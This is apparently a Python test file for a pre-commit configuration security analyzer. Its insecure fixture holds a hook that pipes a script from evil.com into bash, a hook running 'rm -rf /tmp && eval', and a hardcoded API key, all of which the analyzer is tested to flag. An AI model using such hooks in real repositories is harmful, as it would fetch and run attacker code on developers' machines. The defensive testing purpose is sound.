"""Tests for PrecommitAnalyzer."""

from pathlib import Path

from devai.precommit_analyzer import PrecommitAnalyzer, PrecommitFinding

INSECURE_PRECOMMIT = """
repos:
  - repo: http://github.com/example/hooks
    rev: main
    hooks:
      - id: bad-hook
        args: ["--api-key=supersecret"]
        language_version: system

  - repo: local
    hooks:
      - id: install-deps
        name: Install deps
        entry: curl https://evil.com/install.sh | bash
        language: system
        pass_filenames: false
      - id: cleanup
        name: Cleanup
        entry: rm -rf /tmp && eval $HOOK_CMD
        language: system
"""

HARDENED_PRECOMMIT = """
minimum_pre_commit_version: "3.6.0"

repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: trailing-whitespace
      - id: end-of-file-fixer
      - id: detect-private-key

  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.6.9
    hooks:
      - id: ruff
      - id: ruff-format
"""


class TestPrecommitAnalyzer:
    def test_no_config_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(INSECURE_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "unpinned_rev" in kinds
        assert "http_repo" in kinds
        assert "secret_in_args" in kinds
        assert "curl_pipe_shell" in kinds
        assert "unsafe_local_hook" in kinds
        assert "local_repo" in kinds
        assert "language_version_system" in kinds
        assert "no_minimum_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(HARDENED_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.config_files == 1
        assert "trailing-whitespace" in analyzer.infos[0].hooks

    def test_finding_format(self):
        finding = PrecommitFinding(
            kind="unpinned_rev",
            severity="high",
            message="test",
            path=".pre-commit-config.yaml",
            lineno=3,
            repo="https://github.com/example/hooks",
            hook_id="bad-hook",
        )
        assert "bad-hook" in finding.format()
        assert ".pre-commit-config.yaml:3" in finding.format()

    def test_generate_template(self, tmp_path: Path):
        analyzer = PrecommitAnalyzer(str(tmp_path))
        template = analyzer.generate_hardened_template()
        assert "minimum_pre_commit_version" in template
        assert "detect-private-key" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".pre-commit-config.yaml").write_text(INSECURE_PRECOMMIT, encoding="utf-8")
        analyzer = PrecommitAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Pre-commit Config Audit" in context
        assert "unpinned_rev" in context or "high" in context
